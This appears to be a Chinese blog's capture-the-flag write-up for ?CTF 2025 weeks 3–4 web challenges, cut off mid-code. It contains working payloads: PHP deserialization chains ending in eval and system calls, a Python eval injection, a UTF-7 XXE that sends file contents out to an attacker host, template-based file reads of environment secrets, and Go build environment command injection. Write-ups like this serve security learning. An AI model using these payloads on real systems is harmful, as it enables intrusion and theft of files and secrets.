<!DOCTYPE html><script type="text/javascript" src="/js/crash_cheat.js"></script><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>?CTF2025_week3&amp;week4_WP | 晨曦的个人小站</title><meta name="author" content="晨曦"><meta name="copyright" content="晨曦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="?CTF week3和week4的wp">
<meta property="og:type" content="article">
<meta property="og:title" content="?CTF2025_week3&amp;week4_WP">
<meta property="og:url" content="http://example.com/%EF%BC%9FCTF2025_week3&week4_WP/index.html">
<meta property="og:site_name" content="晨曦的个人小站">
<meta property="og:description" content="?CTF week3和week4的wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/%EF%BC%9FCTF2025_week3&week4_WP/%E5%B0%81%E9%9D%A2.jpg">
<meta property="article:published_time" content="2025-11-04T09:00:00.000Z">
<meta property="article:modified_time" content="2025-11-04T09:04:14.410Z">
<meta property="article:author" content="晨曦">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="write up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/%EF%BC%9FCTF2025_week3&week4_WP/%E5%B0%81%E9%9D%A2.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/%EF%BC%9FCTF2025_week3&amp;week4_WP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '?CTF2025_week3&week4_WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-11-04 17:04:14'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/nav.css"><link rel="stylesheet" href="/css/bj.css"><link rel="stylesheet" href="/css/cat.css"><div id="myscoll"></div><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/%EF%BC%9FCTF2025_week3&amp;week4_WP/%E5%B0%81%E9%9D%A2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="晨曦的个人小站"><span class="site-name">晨曦的个人小站</span></a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">?CTF2025_week3&amp;week4_WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-04T09:00:00.000Z" title="发表于 2025-11-04 17:00:00">2025-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-04T09:04:14.410Z" title="更新于 2025-11-04 17:04:14">2025-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>61分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="?CTF2025_week3&amp;week4_WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Week3-魔术大杂烩"><a href="#Week3-魔术大杂烩" class="headerlink" title="[Week3] 魔术大杂烩"></a>[Week3] 魔术大杂烩</h2><p>php反序列化</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuhuarou</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Wuhuarou</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Wuhuarou!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; Wuhuarou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fentiao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fentiao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Hongshufentiao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Fentiao!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; Fentiao -&gt; Hongshufentiao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baicai</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Baicai</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Baicai!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$Baicai</span> = <span class="variable language_">$this</span> -&gt; Baicai;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Baicai</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wanzi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Wanzi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Wanzi!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; Wanzi -&gt; <span class="title function_ invoke__">Xianggu</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xianggu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Xianggu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Jinzhengu</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Xianggu!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; Xianggu -&gt; Bailuobo = <span class="variable language_">$this</span> -&gt; Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huluobo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HuLuoBo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice Huluobo!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Wuhuarou</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou = <span class="keyword">new</span> <span class="title class_">Fentiao</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou-&gt;Fentiao = <span class="keyword">new</span> <span class="title class_">Baicai</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai = <span class="keyword">new</span> <span class="title class_">Wanzi</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi = <span class="keyword">new</span> <span class="title class_">Xianggu</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi-&gt;Xianggu = <span class="keyword">new</span> <span class="title class_">Huluobo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi-&gt;Jinzhengu = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eat=O:8:&quot;Wuhuarou&quot;:1:&#123;s:8:&quot;Wuhuarou&quot;;O:7:&quot;Fentiao&quot;:2:&#123;s:7:&quot;Fentiao&quot;;O:6:&quot;Baicai&quot;:1:&#123;s:6:&quot;Baicai&quot;;O:5:&quot;Wanzi&quot;:1:&#123;s:5:&quot;Wanzi&quot;;O:7:&quot;Xianggu&quot;:2:&#123;s:7:&quot;Xianggu&quot;;O:7:&quot;Huluobo&quot;:1:&#123;s:7:&quot;HuLuoBo&quot;;N;&#125;s:9:&quot;Jinzhengu&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#125;s:14:&quot;Hongshufentiao&quot;;N;&#125;&#125;&amp;1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="Week3-这又是什么函数"><a href="#Week3-这又是什么函数" class="headerlink" title="[Week3] 这又是什么函数"></a>[Week3] 这又是什么函数</h2><p>访问<code>/src</code>，得到源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/doit&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doit</span>():</span><br><span class="line">    e=request.form.get(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>修改<code>__file__</code>为<code>/flag</code>，然后访问<code>/src</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=exec(&quot;global __file__;__file__=&#x27;/flag&#x27;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251018220501828.png" alt="image-20251018220501828"></p>
<h2 id="Week3-查查忆"><a href="#Week3-查查忆" class="headerlink" title="[Week3] 查查忆"></a>[Week3] 查查忆</h2><p>XXE，用UTF-7绕过过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE convert +AFs</span><br><span class="line">    +ADwAIQ-ENTITY +ACU remote SYSTEM +ACI-http://[ip]:[port]/test.dtd+ACIAPg</span><br><span class="line">    +ACU-remote+ADsAJQ-int+ADsAJQ-send+ADs</span><br><span class="line">+AF0APg</span><br></pre></td></tr></table></figure>

<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///f1111llllaa44g&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://[ip]:[port]/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着在服务器用python起一个http服务给题目访问，接着nc监听<code>test.dtd</code>里的端口获取flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251021211705578.png" alt="image-20251021211705578"></p>
<h2 id="Week3-VIP"><a href="#Week3-VIP" class="headerlink" title="[Week3] VIP"></a>[Week3] VIP</h2><p>任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api?template=&#123;&#123;.Utils.GetReader &quot;/proc/self/environ&quot;|.Utils.ReadAll&#125;&#125;</span><br><span class="line"></span><br><span class="line">/api?template=&#123;&#123;.Utils.GetReader &quot;/app/secret_key.txt&quot;|.Utils.ReadAll&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到API_KEY</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qrUt3cA7EyB30rkDNnroMrD9skQ2JEG8zMr</span><br></pre></td></tr></table></figure>

<p>接着是 go build 环境变量注入RCE</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16893">Go build 环境变量注入RCE</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;code&quot;:&quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;\n    println(\&quot;hello cgo\&quot;)\n&#125;&quot;,&quot;env&quot;:&#123;&quot;CC&quot;:&quot;sh -c &#x27;find / -perm -4000 2&gt;/dev/null &gt; /tmp/123.txt&#x27;&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:&quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;\n    println(\&quot;hello cgo\&quot;)\n&#125;&quot;,&quot;env&quot;:&#123;&quot;CC&quot;:&quot;sh -c &#x27;/usr/local/bin/flagread &gt; /tmp/123.txt&#x27;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>读取<code>/tmp/123.txt</code>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api?template=&#123;&#123;.Utils.GetReader%20%22/tmp/123.txt%22|.Utils.ReadAll&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week4-Path-to-Hero"><a href="#Week4-Path-to-Hero" class="headerlink" title="[Week4] Path to Hero"></a>[Week4] Path to Hero</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Class Start</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ishero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adventure</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;ishero, <span class="string">&quot;hero&quot;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;ishero !== <span class="string">&quot;hero&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;adventure-&gt;sword;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;test1 !== <span class="variable language_">$this</span>-&gt;test2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;test1) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;test2)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;go;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Dead&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mon3tr</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;到此为止了！魔王&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;</span>, <span class="variable">$this</span>-&gt;end)) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="variable">$this</span>-&gt;end);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;难道……要输了吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;结束了？&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;HERO&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;HERO&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class Start</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ishero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adventure</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;ishero, <span class="string">&quot;hero&quot;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;ishero !== <span class="string">&quot;hero&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;adventure-&gt;sword;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;test1 !== <span class="variable 